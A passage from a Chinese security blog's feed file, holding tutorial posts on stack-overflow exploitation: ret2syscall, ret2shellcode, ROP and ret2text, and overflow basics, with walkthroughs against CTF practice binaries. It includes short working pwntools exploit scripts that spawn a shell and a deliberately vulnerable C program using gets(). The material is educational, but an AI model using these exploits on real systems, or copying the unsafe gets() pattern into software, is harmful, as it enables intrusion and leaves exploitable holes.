        &lt;h2 id=&quot;ret2libc原理&quot;&gt;&lt;a href=&quot;#ret2libc原理&quot; class=&quot;headerlink&quot; title=&quot;ret2libc原理&quot;&gt;&lt;/a&gt;ret2libc原理&lt;/h2&gt;&lt;p&gt;ret2libc，即控制执行 libc 中的函数，通常是返回至某个函数的 p
      
    
    </summary>
    
      <category term="Pwn" scheme="https://Mi1k7ea.github.com/categories/Pwn/"/>
    
    
      <category term="二进制" scheme="https://Mi1k7ea.github.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="栈溢出" scheme="https://Mi1k7ea.github.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
      <category term="Pwn" scheme="https://Mi1k7ea.github.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>栈溢出之ret2syscall</title>
    <link href="https://Mi1k7ea.github.com/2019/03/03/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2syscall/"/>
    <id>https://Mi1k7ea.github.com/2019/03/03/栈溢出之ret2syscall/</id>
    <published>2019-03-03T14:48:29.000Z</published>
    <updated>2019-03-03T15:51:58.121Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>ret2syscall，即控制程序执行系统调用，获取shell。</p><p>关键在于——程序中存在int 0x80中断，通过该指令可以进行系统调用，其中可通过不同的系统调用号调用不同的系统调用。</p><p>一般地，我们利用如下系统调用来获取shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;/bin/sh&quot;,NULL,NULL)</span><br></pre></td></tr></table></figure><p>当遇到32位程序时，需要使得：</p><ul><li>系统调用号，即 eax 应该为 0xb（0xb 为 execve 对应的系统调用号）</li><li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li><li>第二个参数，即 ecx 应该为 0</li><li>第三个参数，即 edx 应该为 0</li></ul><p>而我们如何控制这些寄存器的值呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。</p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>先运行程序查看基本功能，并file看到是静态链接文件，和libc无关：</p><p><img src="/2019/03/03/栈溢出之ret2syscall/1.png" alt=""></p><p><img src="/2019/03/03/栈溢出之ret2syscall/2.png" alt=""></p><p>checksec发现只开启了NX：</p><p><img src="/2019/03/03/栈溢出之ret2syscall/3.png" alt=""></p><p>打开IDA看到存在gets()即存在栈溢出风险，且IDA中给出变量v4相对于ESP和EBP的偏移分别为ESP+1Ch和EBP-64h：</p><p><img src="/2019/03/03/栈溢出之ret2syscall/4.png" alt=""></p><p>查看String窗口，发现存在“/bin/sh”字符串：</p><p><img src="/2019/03/03/栈溢出之ret2syscall/5.png" alt=""></p><p>当然还可以使用ROPgadget工具搜索，直接找到“/bin/sh”字符串的存储地址，记下该字符串地址为0x080be408：</p><p><img src="/2019/03/03/栈溢出之ret2syscall/6.png" alt=""></p><p>因为是静态链接，不用看libc相关函数，而且函数太多了，直接搜索系统调用吧，记下系统调用的地址为0x08049421：</p><p><img src="/2019/03/03/栈溢出之ret2syscall/7.png" alt=""></p><p>接着寻找pop eax~edx+ret寄存器的指令，记下符合条件的地址分别为0x080bb196和0x0806eb90：</p><p><img src="/2019/03/03/栈溢出之ret2syscall/8.png" alt=""></p><p>至于v4变量到函数返回地址处的偏移量和前面几个题目的计算方法即结果都是一样的，这里不再多说。</p><p>编写payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./ret2syscall"</span>)</span><br><span class="line">int_80_addr = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x080be408</span></span><br><span class="line">pop_eax_addr = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_addr = <span class="number">0x0806eb90</span></span><br><span class="line">payload = flat([<span class="string">"A"</span> * <span class="number">0x70</span>, pop_edx_ecx_ebx_addr, <span class="number">0</span>, <span class="number">0</span>, binsh, pop_eax_addr, <span class="number">0xb</span>, int_80_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>运行后getshell：</p><p><img src="/2019/03/03/栈溢出之ret2syscall/9.png" alt=""></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop/#ret2syscall" target="_blank" rel="noopener">ret2syscall</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ret2syscall&quot;&gt;&lt;a href=&quot;#ret2syscall&quot; class=&quot;headerlink&quot; title=&quot;ret2syscall&quot;&gt;&lt;/a&gt;ret2syscall&lt;/h2&gt;&lt;p&gt;ret2syscall，即控制程序执行系统调用，获取shell。&lt;/
      
    
    </summary>
    
      <category term="Pwn" scheme="https://Mi1k7ea.github.com/categories/Pwn/"/>
    
    
      <category term="二进制" scheme="https://Mi1k7ea.github.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="栈溢出" scheme="https://Mi1k7ea.github.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
      <category term="Pwn" scheme="https://Mi1k7ea.github.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>栈溢出之ret2shellcode</title>
    <link href="https://Mi1k7ea.github.com/2019/03/03/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2shellcode/"/>
    <id>https://Mi1k7ea.github.com/2019/03/03/栈溢出之ret2shellcode/</id>
    <published>2019-03-03T10:52:58.000Z</published>
    <updated>2019-03-05T15:04:22.654Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>ret2shellcode，即控制程序执行shellcode代码——<strong>修改函数返回地址，让其指向溢出数据中的一段指令</strong>。</p><p>shellcode指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。另外，要想执行 shellcode，需要shellcode所在的区域具有可执行权限。</p><p>ret2shellcode的实现在于：在溢出数据内包含一段攻击指令，用攻击指令的起始地址覆盖掉返回地址。</p><blockquote><p><strong>payload :</strong> padding1 + address of shellcode + padding2 + shellcode</p></blockquote><p><img src="/2019/03/03/栈溢出之ret2shellcode/1.png" alt=""></p><p>padding1 处的数据可以随意填充（注意如果利用字符串程序输入溢出数据不要包含 “\x00” ，否则向程序传入溢出数据时会造成截断），长度应该刚好覆盖函数的基地址。address of shellcode 是后面 shellcode 起始处的地址，用来覆盖返回地址。padding2 处的数据也可以随意填充，长度可以任意。shellcode 应该为十六进制的机器码格式，但有个前提是shellcode所在的代码段需要具有可执行权限。</p><p><strong>一个问题——shellcode地址如何确定？</strong></p><p>我们可以在调试工具里查看返回地址的位置（可以查看 ebp 的内容然后再加4（32位机）），可是在调试工具里的这个地址和正常运行时并不一致，这是运行时环境变量等因素有所不同造成的。所以这种情况下我们只能得到大致但不确切的 shellcode 起始地址，<strong>解决办法是在 padding2 里填充若干长度的 “\x90”</strong>。这个机器码对应的指令是 NOP (No Operation)，也就是告诉 CPU 什么也不做，然后跳到下一条指令。<strong>有了这一段 NOP 的填充，只要返回地址能够命中这一段中的任意位置，都可以无副作用地跳转到 shellcode 的起始处，所以这种方法被称为 NOP Sled</strong>。这样我们就可以通过增加 NOP 填充来配合试验 shellcode 起始地址。</p><p>操作系统可以将函数调用栈的起始地址设为随机化（这种技术被称为内存布局随机化，即ASLR），这样程序每次运行时函数返回地址会随机变化。反之如果操作系统关闭了上述的随机化（这是技术可以生效的前提），那么程序每次运行时函数返回地址会是相同的，这样我们可以通过输入无效的溢出数据来生成core文件，再通过调试工具在core文件中找到返回地址的位置，从而确定 shellcode 的起始地址。</p><p>最后可以拼接出最终的溢出数据，输入至程序来执行 shellcode 了：</p><p><img src="/2019/03/03/栈溢出之ret2shellcode/2.png" alt=""></p><p>这种方法生效的一个前提是在函数调用栈上的数据（shellcode）要有可执行的权限（另一个前提是上面提到的关闭内存布局随机化）。很多时候操作系统会关闭函数调用栈的可执行权限，这样 shellcode 的方法就失效了，不过我们还可以尝试使用内存里已有的指令或函数，毕竟这些部分本来就是可执行的，所以不会受上述执行权限的限制。这就包括ret2libc等其他的ROP方法。</p><p><strong>前提条件</strong></p><p>由前面分析可知，ret2shell这项技术的前提是需要操作系统关闭内存布局随机化（ASLR）以及需要程序调用栈有可执行权限。</p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>运行程序，提示这次没有system()给你直接调用，且文件是动态链接的：</p><p><img src="/2019/03/03/栈溢出之ret2shellcode/3.png" alt=""></p><p><img src="/2019/03/03/栈溢出之ret2shellcode/4.png" alt=""></p><p>checksec可以看出源程序没有开启任何保护：</p><p><img src="/2019/03/03/栈溢出之ret2shellcode/5.png" alt=""></p><p>IDA打开查看，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到buf2处，简单地说，就是程序允许用户输入一段内容，然后程序将该内容复制到buf2中：</p><p><img src="/2019/03/03/栈溢出之ret2shellcode/6.png" alt=""></p><p>点击查看可知buf2在bss段：</p><p><img src="/2019/03/03/栈溢出之ret2shellcode/7.png" alt=""></p><p>string窗口确实如题目所示，没有直接提供system(“/bin/sh”)给我们调用了：</p><p><img src="/2019/03/03/栈溢出之ret2shellcode/8.png" alt=""></p><p>为了明确是否可以将shellcode写入buf2中执行，通过vmmap可以看到bss段对应的地址具有可执行权限（先main下断点、r再vmmap）：</p><p><img src="/2019/03/03/栈溢出之ret2shellcode/9.png" alt=""></p><p>可以看到，buf2变量所在的bss段是可读可写可执行的，因此这里可以输入shellcode、然后程序将shellcode复制至此处，最后在函数返回地址处踩掉该地址跳转至buf2执行shellcode。整个过程即为ret2shellcode原理。</p><p>使用GDB pattern字符串溢出计算变量v4到函数返回地址的偏移量为112，即0x70：</p><p><img src="/2019/03/03/栈溢出之ret2shellcode/11.png" alt=""></p><p>编写payload，使用pwntools的asm(shellcraft.sh())可以直接简便地生成汇编代码形式的反弹shell的shellcode：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./ret2shellcode"</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = <span class="number">0x0804a080</span></span><br><span class="line">payload = flat([shellcode.ljust(<span class="number">0x70</span>, <span class="string">"A"</span>), buf2_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>运行直接getshell：</p><p><img src="/2019/03/03/栈溢出之ret2shellcode/10.png" alt=""></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/25816426" target="_blank" rel="noopener">手把手教你栈溢出从入门到放弃（上）</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop/#ret2shellcode" target="_blank" rel="noopener">ret2shellcode</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ret2shellcode&quot;&gt;&lt;a href=&quot;#ret2shellcode&quot; class=&quot;headerlink&quot; title=&quot;ret2shellcode&quot;&gt;&lt;/a&gt;ret2shellcode&lt;/h2&gt;&lt;p&gt;ret2shellcode，即控制程序执行shell
      
    
    </summary>
    
      <category term="Pwn" scheme="https://Mi1k7ea.github.com/categories/Pwn/"/>
    
    
      <category term="二进制" scheme="https://Mi1k7ea.github.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="栈溢出" scheme="https://Mi1k7ea.github.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
      <category term="Pwn" scheme="https://Mi1k7ea.github.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>ROP基础及栈溢出之ret2text</title>
    <link href="https://Mi1k7ea.github.com/2019/03/03/ROP%E4%B9%8Bret2text/"/>
    <id>https://Mi1k7ea.github.com/2019/03/03/ROP之ret2text/</id>
    <published>2019-03-03T08:18:36.000Z</published>
    <updated>2019-03-03T11:01:58.879Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>ROP，Return Oriented Programming，核心操作就是——<strong>修改返回地址，让其指向内存中已有的一段指令，可用于绕过NX的保护机制</strong>。</p><p>ROP的思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>所谓 gadgets 就是以ret结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件：</p><ul><li>程序存在溢出，并且可以控制返回地址。</li><li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li></ul><p>ROP要完成的任务包括：在内存中确定某段指令的地址，并用其覆盖返回地址。</p><p>下面看下单个Gadget和多个Gadgets进行溢出的原理示例。</p><h3 id="单个Gadget溢出示例"><a href="#单个Gadget溢出示例" class="headerlink" title="单个Gadget溢出示例"></a>单个Gadget溢出示例</h3><p>其payload是如下形式，使用padding溢出到返回地址前，再将gadget地址传到返回地址处：</p><blockquote><p><strong>payload :</strong> padding + address of gadget</p></blockquote><p><img src="/2019/03/03/ROP之ret2text/1.png" alt=""></p><h3 id="多个Gadgets溢出示例"><a href="#多个Gadgets溢出示例" class="headerlink" title="多个Gadgets溢出示例"></a>多个Gadgets溢出示例</h3><p>如果想连续执行若干段指令，就需要每个 gadget 执行完毕可以将控制权交给下一个 gadget。所以 gadget 的最后一步应该是 RET 指令，这样程序的控制权（EIP）才能得到切换，所以这种技术被称为返回导向编程( <strong>R</strong>eturn <strong>O</strong>riented <strong>P</strong>rogramming )。要执行多个 gadget，溢出数据应该以下面的方式构造：</p><blockquote><p><strong>payload :</strong> padding + address of gadget 1 + address of gadget 2 + ……  + address of gadget n</p></blockquote><p>在这样的构造下，被调用函数返回时会跳转执行 gadget 1，执行完毕时 gadget 1 的 RET 指令会将此时的栈顶数据（也就是 gadget 2 的地址）弹出至 EIP，程序继续跳转执行 gadget 2，以此类推。</p><p><img src="/2019/03/03/ROP之ret2text/2.png" alt=""></p><p>……（待补充）</p><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>ret2text即控制程序执行程序本身已有的的代码 (.text)。也就是说，在该ELF的.text代码段中是存在可以利用的代码的，如存在system(“/bin/sh”)的代码。</p><p>下面按照一般的做题步骤做下吧。</p><h3 id="一、运行程序，了解执行流程"><a href="#一、运行程序，了解执行流程" class="headerlink" title="一、运行程序，了解执行流程"></a>一、运行程序，了解执行流程</h3><p>运行程序，输入内容后即返回：</p><p><img src="/2019/03/03/ROP之ret2text/3.png" alt=""></p><h3 id="二、file查看elf文件是否动态链接"><a href="#二、file查看elf文件是否动态链接" class="headerlink" title="二、file查看elf文件是否动态链接"></a>二、file查看elf文件是否动态链接</h3><p>可用看到是32位ELF文件，且是动态链接的，即可能与libc相关：</p><p><img src="/2019/03/03/ROP之ret2text/4.png" alt=""></p><h3 id="三、checksec查看保护机制"><a href="#三、checksec查看保护机制" class="headerlink" title="三、checksec查看保护机制"></a>三、checksec查看保护机制</h3><p>查看一下程序的保护机制，可以看到是32位的程序且仅仅开启了栈不可执行保护NX：</p><p><img src="/2019/03/03/ROP之ret2text/5.png" alt=""></p><h3 id="四、使用IDA进行静态汇编代码分析"><a href="#四、使用IDA进行静态汇编代码分析" class="headerlink" title="四、使用IDA进行静态汇编代码分析"></a>四、使用IDA进行静态汇编代码分析</h3><p>IDA打开查看，可以看出程序在主函数中使用了gets函数，显然存在栈溢出漏洞，且可看到变量v4相对于ESP和EBP寄存器的偏移：</p><p><img src="/2019/03/03/ROP之ret2text/6.png" alt=""></p><p>由于NX启动了即栈不可执行，我们可以到其他的地方查看，打开shift+F12打开string窗口，可用看到“/bin/sh/”字符串：</p><p><img src="/2019/03/03/ROP之ret2text/7.png" alt=""></p><p>双击点击进去，发现是在secure函数中调用的：</p><p><img src="/2019/03/03/ROP之ret2text/8.png" alt=""></p><p>点击后面的secure，进入secure函数发现了存在直接调用system(“/bin/sh”)的代码，那么如果我们直接控制程序返回至0x0804863A，那么就可以得到shell了：</p><p><img src="/2019/03/03/ROP之ret2text/9.png" alt=""></p><p>现在已经明确了可利用的Gadget地址，即反弹shell的地址：0x0804863A。</p><h3 id="五、计算偏移地址"><a href="#五、计算偏移地址" class="headerlink" title="五、计算偏移地址"></a>五、计算偏移地址</h3><p>构造payload之前，需要计算能够控制的内存的起始地址距离main()函数的返回地址的字节数。</p><h4 id="Method-1——GDB断点调试获取"><a href="#Method-1——GDB断点调试获取" class="headerlink" title="Method 1——GDB断点调试获取"></a>Method 1——GDB断点调试获取</h4><p>先查看一下gets()函数的汇编代码，得知该字符串是通过相对于ESP的索引（具体如何判断可看后面的调试）：</p><p><img src="/2019/03/03/ROP之ret2text/10.png" alt=""></p><p>可知gets()函数地址为0x080486AE，在该处设置断点进行调试：</p><p><img src="/2019/03/03/ROP之ret2text/11.png" alt=""></p><p>ESP为ffffcfa0，其中存放的内容为ffffcfbc，即输入的内容s的地址为ESP+1c= ffffcfbc，而EBP为ffffd028，则s到EBP的偏移为|ffffd028- ffffcfbc|=6c，所以s相对与返回地址的偏移为0x6c+4=0x70。</p><p>确认一遍，在gets()函数的下一条汇编指令处打断点，继续运行并输入一大串1：</p><p><img src="/2019/03/03/ROP之ret2text/12.png" alt=""></p><p>可以发现EAX地址处确实保存的是s（数据换成1），且|EAX-ESP|=|0xffffcfbc-0xffffcfa0|=1c，即说明s是相对于ESP偏移的；但|EAX-EBP|=|0xffffcfbc-0xffffd028|=6c，和IDA给出的64h有差别，由此可知IDA给出的相对于ESP的偏移是正确的、但相对于EBP的偏移是有误差的，这就是之前说的IDA分析给出的偏移量并不那么可信。</p><h4 id="Method2——使用GDB-pattern字符串溢出计算偏移量"><a href="#Method2——使用GDB-pattern字符串溢出计算偏移量" class="headerlink" title="Method2——使用GDB pattern字符串溢出计算偏移量"></a>Method2——使用GDB pattern字符串溢出计算偏移量</h4><p>GDB的pattern_create创建计算溢出偏移量的字符串，在输入内容时输入即可：</p><p><img src="/2019/03/03/ROP之ret2text/13.png" alt=""></p><p>pattern_offset算出偏移量：</p><p><img src="/2019/03/03/ROP之ret2text/14.png" alt=""></p><p>得出s与函数返回地址的偏移为112即0x70。</p><h3 id="六、编写payload"><a href="#六、编写payload" class="headerlink" title="六、编写payload"></a>六、编写payload</h3><p>由前面分析知，可以利用.text代码段区域中的system(“/bin/sh”)代码，该代码段即为可被ROP利用的Gadget，地址为0x0804863a，将其覆盖到函数返回地址处，前面再padding 70h个字节码即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./ret2text"</span>)</span><br><span class="line">binsh_addr = <span class="number">0x0804863a</span></span><br><span class="line">payload = flat([<span class="string">"A"</span> * <span class="number">0x70</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>运行后，成功getshell：</p><p><img src="/2019/03/03/ROP之ret2text/15.png" alt=""></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop/" target="_blank" rel="noopener">基本 ROP</a></p><p><a href="https://zhuanlan.zhihu.com/p/25892385" target="_blank" rel="noopener">手把手教你栈溢出从入门到放弃（下）</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ROP&quot;&gt;&lt;a href=&quot;#ROP&quot; class=&quot;headerlink&quot; title=&quot;ROP&quot;&gt;&lt;/a&gt;ROP&lt;/h2&gt;&lt;p&gt;ROP，Return Oriented Programming，核心操作就是——&lt;strong&gt;修改返回地址，让其指向内存中已有的一
      
    
    </summary>
    
      <category term="Pwn" scheme="https://Mi1k7ea.github.com/categories/Pwn/"/>
    
    
      <category term="二进制" scheme="https://Mi1k7ea.github.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="栈溢出" scheme="https://Mi1k7ea.github.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
      <category term="Pwn" scheme="https://Mi1k7ea.github.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>栈溢出基本原理</title>
    <link href="https://Mi1k7ea.github.com/2019/03/03/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/"/>
    <id>https://Mi1k7ea.github.com/2019/03/03/栈溢出基本原理/</id>
    <published>2019-03-03T02:21:25.000Z</published>
    <updated>2019-03-09T07:18:27.740Z</updated>
    
    <content type="html"><![CDATA[<h2 id="栈溢出基本原理"><a href="#栈溢出基本原理" class="headerlink" title="栈溢出基本原理"></a>栈溢出基本原理</h2><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是：</p><ul><li>程序必须向栈上写入数据。</li><li>写入的数据大小没有被良好地控制。</li></ul><p><strong>当函数正在执行内部指令的过程中我们无法拿到程序的控制权，只有在发生函数调用或者结束函数调用时，程序的控制权会在函数状态之间发生跳转，这时才可以通过修改函数状态来实现攻击。</strong>而控制程序执行指令最关键的寄存器就是 EIP，所以栈溢出利用就是让 EIP载入攻击指令的地址。</p><h3 id="1、函数调用结束时"><a href="#1、函数调用结束时" class="headerlink" title="1、函数调用结束时"></a>1、函数调用结束时</h3><p>先来看看函数调用结束时，如果要让 EIP指向攻击指令，需要哪些准备。</p><p>首先，在Pop过程中，返回地址会被传给 EIP，所以我们只需要让溢出数据用攻击指令的地址来覆盖返回地址就可以了。其次，我们可以在溢出数据内包含一段攻击指令，也可以在内存其他位置寻找可用的攻击指令。</p><p><img src="/2019/03/03/栈溢出基本原理/1.png" alt=""></p><h3 id="2、函数调用开始时"><a href="#2、函数调用开始时" class="headerlink" title="2、函数调用开始时"></a>2、函数调用开始时</h3><p>再来看看函数调用开始时，如果要让 EIP指向攻击指令，需要哪些准备。</p><p>这时，EIP会指向原程序中某个指定的函数，我们没法通过改写返回地址来控制了，不过我们可以“偷梁换柱”——将原本指定的函数在调用时替换为其他函数。</p><h2 id="栈溢出Demo"><a href="#栈溢出Demo" class="headerlink" title="栈溢出Demo"></a>栈溢出Demo</h2><p>编写一段简单的调用gets()函数代码，主要目的读取一个字符串，并将其输出，可明显知道是存在栈溢出漏洞的，我们可以控制程序执行pwn()函数实现栈溢出效果测试：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pwn</span><span class="params">()</span> </span>&#123; <span class="built_in">puts</span>(<span class="string">"Stack Overflow! Hacked By Mi1k7ea."</span>); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">12</span>];</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译该c文件：<code>gcc -m32 -fno-stack-protector stack_test.c -o stack_test</code>。</p><blockquote><p>gcc 编译指令中，<code>-m32</code> 指的是生成 32 位程序； <code>-fno-stack-protector</code> 指的是不开启堆栈溢出保护，即不生成 canary。 此外，为了更加方便地介绍栈溢出的基本利用方式，这里还需要关闭 PIE（Position Independent Executable），避免加载基址被打乱。不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令<code>gcc -v</code>查看 gcc 默认的开关情况。如果含有<code>--enable-default-pie</code>参数则代表 PIE 默认已开启，需要在编译指令中添加参数<code>-no-pie</code>。</p></blockquote><p><img src="/2019/03/03/栈溢出基本原理/2.png" alt=""></p><p>可以看出，gcc警告说gets()是一个危险函数，它从不检查输入字符串的长度，而是以回车来判断输入是否结束，导致栈溢出漏洞存在。</p><p>下面就来简单描述一下栈溢出攻击利用的步骤吧。</p><h3 id="1、运行程序，了解功能"><a href="#1、运行程序，了解功能" class="headerlink" title="1、运行程序，了解功能"></a>1、运行程序，了解功能</h3><p>程序功能很简单，输入什么输出什么：</p><p><img src="/2019/03/03/栈溢出基本原理/3.png" alt=""></p><h3 id="2、file查看elf文件是否动态链接"><a href="#2、file查看elf文件是否动态链接" class="headerlink" title="2、file查看elf文件是否动态链接"></a>2、file查看elf文件是否动态链接</h3><p>可以看到，该ELF文件是动态链接的：</p><p><img src="/2019/03/03/栈溢出基本原理/5.png" alt=""></p><p>为什么要多做这可能没用的一步呢？因为后面会让我们提前知道这题到底会不会设计到libc相关的内容，若为静态文件则无需这方面的考虑。</p><h3 id="3、checksec检查安全编译选项"><a href="#3、checksec检查安全编译选项" class="headerlink" title="3、checksec检查安全编译选项"></a>3、checksec检查安全编译选项</h3><p>可以看到，只开启了NX，和GCC编译时的选项是一致的：</p><p><img src="/2019/03/03/栈溢出基本原理/4.png" alt=""></p><h3 id="4、使用IDA进行静态汇编代码分析"><a href="#4、使用IDA进行静态汇编代码分析" class="headerlink" title="4、使用IDA进行静态汇编代码分析"></a>4、使用IDA进行静态汇编代码分析</h3><p>使用IDA打开该ELF文件，F5，点击vulnerable()函数，关注到其中的gets()函数是存在栈溢出漏洞的，而它的s参数在其上方定义了，关注到IDA给出变量s相对于ESP和EBP的偏移量分别为ESP+4h和EBP-14h：</p><p><img src="/2019/03/03/栈溢出基本原理/6.png" alt=""></p><p>由此知道，gets()导致存在栈溢出漏洞，而其参数s距离EBP的偏移地址为14h。</p><p>同时，点击查看我们需要溢出至调用的目标函数pwn()，记下它的地址0x0804843B：</p><p><img src="/2019/03/03/栈溢出基本原理/7.png" alt=""></p><h3 id="5、计算偏移地址"><a href="#5、计算偏移地址" class="headerlink" title="5、计算偏移地址"></a>5、计算偏移地址</h3><p>构造payload之前，需要计算能够控制的内存的起始地址距离main()函数的返回地址的字节数。这里为计算变量s距离main()函数的返回地址的字节数。</p><p>由函数调用栈可知，要计算能够控制的内存的起始地址距离main()函数的返回地址的字节数，都是先通过计算出能够控制的内存的起始地址距离EBP的字节数，再加上4即可，看下图便一目了然：</p><p><img src="/2019/03/03/栈溢出基本原理/8.png" alt=""></p><p>其实由第四步的IDA分析可以知道，参数s距离EBP的偏移地址为14h。</p><p>但是有时候并不能完全相信IDA计算出来的偏移，最为准确的是用GDB打断点调试出来，下面介绍两种GDB方法。</p><h4 id="（1）GDB断点调试获取"><a href="#（1）GDB断点调试获取" class="headerlink" title="（1）GDB断点调试获取"></a>（1）GDB断点调试获取</h4><p>先用IDA查看gets()函数的地址，获取到其地址为0x08048461：</p><p><img src="/2019/03/03/栈溢出基本原理/9.png" alt=""></p><p>在GDB中在该地址打下断点并运行，看到程序在调用gets()函数前停下，这时看到EBP为0xffffd028、ESP为0xffffd000：</p><p><img src="/2019/03/03/栈溢出基本原理/10.png" 